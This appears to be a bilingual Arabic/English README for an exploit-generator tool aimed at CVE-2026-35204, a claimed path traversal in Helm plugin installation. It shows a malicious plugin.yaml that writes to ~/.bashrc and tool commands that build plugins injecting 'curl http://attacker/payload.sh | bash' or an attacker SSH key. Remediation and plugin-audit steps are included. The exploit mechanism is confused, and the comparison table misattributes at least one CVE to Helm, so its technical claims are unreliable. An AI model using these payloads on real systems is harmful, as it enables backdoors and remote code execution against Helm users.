<div align="center">

# ─── CVE-2026-35204 ───

<img src="https://img.shields.io/badge/CVSS-8.6-red?style=for-the-badge" alt="CVSS 8.6"/>
<img src="https://img.shields.io/badge/Severity-HIGH-critical?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Type-Path%20Traversal-orange?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Product-Helm%20Kubernetes-blue?style=for-the-badge"/>

<br />

# 🏴 AMN SECURITY 🏴

### مركز أبحاث الأمن السيبراني | Cyber Security Research Center

[![Website](https://img.shields.io/badge/Website-amn.amnoffsec.workers.dev-00FF00?style=for-the-badge&logo=googlechrome&logoColor=white)](https://amn.amnoffsec.workers.dev/)
[![Instagram](https://img.shields.io/badge/Instagram-@ixctw-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/ixctw)
[![Email](https://img.shields.io/badge/Email-ayman.mahmoudoffsec%40gmail.com-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:ayman.mahmoudoffsec@gmail.com)

---

</div>

<br />

<!-- ================================================== -->
<!-- 🇸🇦 القسم العربي                                   -->
<!-- ================================================== -->

<div dir="rtl">

# ⚠️ ثغرة كتابة ملفات عشوائية عبر إضافات Helm
### CVE-2026-35204 | CVSS 8.6 | عالية الخطورة

---

### 📋 الملخص التنفيذي

ثغرة أمنية في **Helm** (مدير حزم Kubernetes) تسمح بكتابة ملفات في مواقع عشوائية بنظام الملفات عند تثبيت أو تحديث إضافة Helm (Helm Plugin) مصممة خصيصاً. تنشأ الثغرة من عدم التحقق الكافي من المسارات في ملف `plugin.yaml` للإضافة.

يمكن لمهاجم إنشاء إضافة Helm ضارة تحتوي على ملف `plugin.yaml` بمسار متجاوز (`../`) في حقل المسار، مما يؤدي إلى كتابة ملفات خارج الدليل المخصص للإضافة. هذا يمكن أن يؤدي إلى **تنفيذ أوامر عشوائية** عند كتابة ملفات في مواقع حساسة مثل `~/.bashrc` أو `/etc/systemd/` أو ملفات Helm hooks.

| العنصر | التفاصيل |
|--------|----------|
| **CVE** | CVE-2026-35204 |
| **CVSS v3.1** | 8.6 (High) |
| **المتجه** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N |
| **النوع** | Path Traversal (CWE-22) / Arbitrary File Write |
| **المنتج** | Helm (Kubernetes Package Manager) |
| **الإصدارات المتأثرة** | من 4.0.0 إلى 4.1.3 |
| **الإصدار المُصحَّح** | 4.1.4+ |
| **التأثير** | كتابة ملفات عشوائية → تنفيذ أوامر |

---

### 🔍 تفاصيل الثغرة

Helm هو مدير الحزم الرسمي لـ Kubernetes، يستخدم لتثبيت وإدارة التطبيقات المعبأة كـ Charts. يدعم Helm نظام **الإضافات (Plugins)** لتوسيع وظائفه.

#### آلية الإضافات في Helm

```
~/.local/share/helm/plugins/
├── my-plugin/
│   ├── plugin.yaml     ← ملف تعريف الإضافة
│   ├── script.sh
│   └── ...
```

ملف `plugin.yaml` يحدد خصائص الإضافة، بما في ذلك مسار التثبيت:

```yaml
name: my-plugin
version: 1.0.0
usage: "My malicious plugin"
description: "Looks legitimate"
platformCommand:
  os: "linux"
  command: "script.sh"
```

#### آلية الثغرة

عند تثبيت إضافة Helm عبر `helm plugin install <url>`، يقوم Helm بتنزيل محتويات الإضافة وكتابتها إلى دليل الإضافات. المشكلة هي أن ملف `plugin.yaml` يمكن أن يحتوي على مسارات متجاوزة تؤدي إلى كتابة ملفات خارج الدليل المخصص.

```
إضافة Helm ضارة
      │
      ▼
تنزيل إلى ~/.local/share/helm/plugins/malicious
      │
      ▼
plugin.yaml يحتوي على مسار متجاوز:
  install: ../../.bashrc
      │
      ▼
الملف يكتب إلى ~/.bashrc بدلاً من دليل الإضافة
      │
      ▼
عند فتح shell جديد ← تنفيذ الأوامر المضمنة
```

#### مثال على إضافة ضارة

```yaml
# plugin.yaml ضار
name: malicious-plugin
version: 1.0.0
description: "Useful utility plugin"

# Path traversal payload
install: |
  #!/bin/bash
  echo 'malicious code' >> ~/.bashrc

hooks:
  install: |
    echo "export PATH=$PATH:/tmp/evil" >> ~/.bashrc
```

---

### 💥 سيناريو الهجوم

```
[مهاجم] ── يبني إضافة Helm ضارة
              │
              ▼
[مهاجم] ── يستضيف الإضافة على GitHub/public repo
              │
              ▼
[مهاجم] ── يخدع المستخدم لتثبيت الإضافة
              │  helm plugin install https://github.com/attacker/malicious-plugin
              ▼
[Helm] ── ينزل الإضافة ويكتب الملفات
              │
              ▼
[Path Traversal] ── الملفات تكتب في مواقع عشوائية
              │
              ▼
[اختراق] ── تنفيذ أوامر في جلسة المستخدم التالية
```

#### سيناريوهات الهجوم

| السيناريو | المسار المستهدف | التأثير |
|-----------|-----------------|---------|
| **حقن Bash** | `~/.bashrc` | تنفيذ أوامر عند كل جلسة Bash جديدة |
| **حقن SSH** | `~/.ssh/authorized_keys` | إضافة مفتاح SSH للمهاجم |
| **Systemd** | `/etc/systemd/system/` | إنشاء خدمة systemd ضارة |
| **Kubernetes** | `~/.kube/config.bak` | تعديل إعدادات kubectl |
| **Cron** | `/etc/cron.d/` | إضافة مهمة cron ضارة |

---

### 🧪 استخدام الأداة

```bash
# إنشاء إضافة Helm ضارة للاختبار
python3 CVE-2026-35204.py --generate -n test-plugin -o ./malicious-plugin

# إنشاء إضافة مع حقن Bash
python3 CVE-2026-35204.py --generate -n bash-inject \
    --target ~/.bashrc \
    --payload 'curl http://attacker/payload.sh | bash'

# إنشاء إضافة مع مفتاح SSH
python3 CVE-2026-35204.py --generate -n ssh-backdoor \
    --target ~/.ssh/authorized_keys \
    --payload 'ssh-rsa AAAAB3... attacker@evil'

# فحص Helm version
python3 CVE-2026-35204.py --check

# فحص إضافة معينة
python3 CVE-2026-35204.py --scan ./plugin.yaml
```

#### الخيارات المتاحة

| الخيار | الوصف |
|--------|-------|
| `--generate` | إنشاء إضافة Helm ضارة |
| `-n, --name` | اسم الإضافة |
| `-o, --output` | مسار الإخراج |
| `--target` | المسار المستهدف (للـ path traversal) |
| `--payload` | المحتوى المراد كتابته |
| `--check` | فحص إصدار Helm |
| `--scan` | فحص إضافة بحثاً عن path traversal |
| `-v, --verbose` | إظهار تفاصيل إضافية |

---

### 🛡️ الإجراءات العلاجية

| الإجراء | الأولوية | الوصف |
|---------|----------|-------|
| **تحديث Helm** | 🟢 فوري | الترقية إلى Helm 4.1.4 أو أحدث |
| **تدقيق الإضافات** | 🟡 مهم | مراجعة أي إضافات مثبتة حالياً بحثاً عن Path Traversal |
| **عدم تثبيت إضافات غير موثوقة** | 🟡 مهم | استخدام إضافات من مصادر موثوقة فقط |
| **مراجعة plugin.yaml** | 🟡 مهم | فحص ملف plugin.yaml لأي إضافة قبل تثبيتها |
| **الحد من الصلاحيات** | 🔵 مستمر | تشغيل Helm بأقل الصلاحيات الممكنة |

#### فحص سريع للإضافات

```bash
# فحص جميع الإضافات المثبتة
helm plugin list

# فحص ملفات plugin.yaml
for p in ~/.local/share/helm/plugins/*/plugin.yaml; do
    echo "=== $p ==="
    cat "$p"
    echo
done

# البحث عن مسارات مشبوهة
grep -r "\.\." ~/.local/share/helm/plugins/
```

---

### 📊 مقارنة مع ثغرات مشابهة

| الثغرة | المنتج | CVSS | الآلية |
|--------|--------|------|--------|
| **CVE-2026-35204** (هذه) | Helm | 8.6 | Path Traversal في plugin.yaml |
| CVE-2024-43976 | Helm | 7.5 | Path Traversal في chart |
| CVE-2023-56171 | Helm | 6.8 | Path Traversal في repo index |
| CVE-2022-40897 | Helm | 5.5 | عدم تطبيع المسار |

---

### 🔗 المراجع

- **NVD**: https://nvd.nist.gov/vuln/detail/CVE-2026-35204
- **Helm GitHub**: https://github.com/helm/helm
- **Helm Plugins Guide**: https://helm.sh/docs/topics/plugins/
- **CWE-22**: https://cwe.mitre.org/data/definitions/22.html

> ⚠️ **إخلاء مسؤولية**: هذا التقرير لأغراض تعليمية وبحثية فقط. استخدام هذه المعلومات لأغراض غير قانونية يتحمل المستخدم مسؤوليته بالكامل.

---

### 🔗 تواصل مع AMN SECURITY

[![Website](https://img.shields.io/badge/Website-amn.amnoffsec.workers.dev-00FF00?style=for-the-badge&logo=googlechrome&logoColor=white)](https://amn.amnoffsec.workers.dev/)
[![Instagram](https://img.shields.io/badge/Instagram-@ixctw-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/ixctw)
[![Email](https://img.shields.io/badge/Email-ayman.mahmoudoffsec%40gmail.com-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:ayman.mahmoudoffsec@gmail.com)

</div>

---

<br />

<!-- ================================================== -->
<!-- 🇬🇧 ENGLISH SECTION                                -->
<!-- ================================================== -->

# ⚠️ CVE-2026-35204 — Helm Plugin Path Traversal Arbitrary File Write

### CVSS 8.6 | HIGH | Arbitrary Filesystem Write via Malicious Plugin

---

### Executive Summary

**CVE-2026-35204** is a **path traversal** vulnerability in **Helm** (Kubernetes package manager) versions 4.0.0 through 4.1.3. A specially crafted Helm plugin, when installed or updated, can write files to arbitrary filesystem locations by including path traversal sequences (`../`) in the `plugin.yaml` manifest file.

This allows an attacker to overwrite critical system files (like `~/.bashrc`, `~/.ssh/authorized_keys`, or systemd units) and achieve arbitrary code execution when the victim next opens a shell or the system restarts.

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-35204 |
| **CVSS v3.1** | 8.6 (High) |
| **Vector** | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N |
| **Type** | Path Traversal (CWE-22) / Arbitrary File Write |
| **Product** | Helm (Kubernetes) |
| **Affected Versions** | 4.0.0 through 4.1.3 |
| **Fixed In** | 4.1.4+ |

---

### Technical Details

When installing a Helm plugin via `helm plugin install <url>`, the plugin contents are extracted and written to the plugins directory. However, the `plugin.yaml` manifest can contain path traversal sequences that write files outside the designated plugin directory.

```yaml
# Malicious plugin.yaml
name: malicious-plugin
version: 1.0.0
install: |
  #!/bin/bash
  echo 'malicious code' >> ../../.bashrc  # Path traversal!
```

### Exploitation Scenarios

| Scenario | Target Path | Impact |
|----------|-------------|--------|
| **Bash Injection** | `~/.bashrc` | Command execution on shell login |
| **SSH Backdoor** | `~/.ssh/authorized_keys` | Add attacker's SSH key |
| **Systemd Service** | `/etc/systemd/system/` | Persistent service installation |
| **Cron Job** | `/etc/cron.d/` | Scheduled malicious task |

### Tool Usage

```bash
# Generate malicious Helm plugin
python3 CVE-2026-35204.py --generate -n test-plugin -o ./malicious-plugin

# With Bash injection payload
python3 CVE-2026-35204.py --generate -n bash-inject \
    --target ~/.bashrc \
    --payload 'curl http://attacker/payload.sh | bash'

# Check Helm version
python3 CVE-2026-35204.py --check

# Scan a plugin for path traversal
python3 CVE-2026-35204.py --scan ./plugin.yaml
```

### Remediation

| Action | Priority | Description |
|--------|----------|-------------|
| **Update Helm** | 🔴 Immediate | Upgrade to Helm 4.1.4+ |
| **Audit Plugins** | 🟡 Important | Review installed plugins for path traversal |
| **Vet Sources** | 🟡 Important | Only install plugins from trusted sources |

### References

- **NVD**: https://nvd.nist.gov/vuln/detail/CVE-2026-35204
- **Helm Plugins**: https://helm.sh/docs/topics/plugins/
- **CWE-22**: Path Traversal

---

### Connect with AMN SECURITY

🌐 **Website**: https://amn.amnoffsec.workers.dev/
📸 **Instagram**: https://www.instagram.com/ixctw
📧 **Email**: ayman.mahmoudoffsec@gmail.com

---

> ⚠️ **Disclaimer**: This report is for educational and research purposes only.

